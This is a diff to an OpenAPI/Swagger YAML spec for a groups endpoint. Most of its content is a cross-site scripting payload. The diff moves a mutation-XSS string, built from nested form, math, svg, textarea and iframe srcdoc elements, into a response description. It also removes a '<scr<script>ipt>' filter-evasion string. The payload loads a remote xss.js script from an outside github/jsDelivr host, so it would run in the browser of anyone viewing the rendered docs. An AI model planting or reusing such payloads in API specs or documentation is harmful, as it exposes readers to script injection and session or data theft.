@@ -62,16 +62,15 @@ paths:
       summary: Finds groups by id
     post:
       parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://sachin-v3rma.github.io/xss.js></script>">
-
+        - description: gg
           in: path
           name: id
           required: true
           type: string
       responses:
         '200':
-          description: No <h1>response was <scr<script>ipt>ipt<script>>specified
+          description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://cdn.jsdelivr.net/gh/Sachin-v3rma/Sachin-v3rma.github.io@main/xss.js></script>">
       tags:
         - accounts
       description: 'You cannot create an LDAP group with a POST.  '
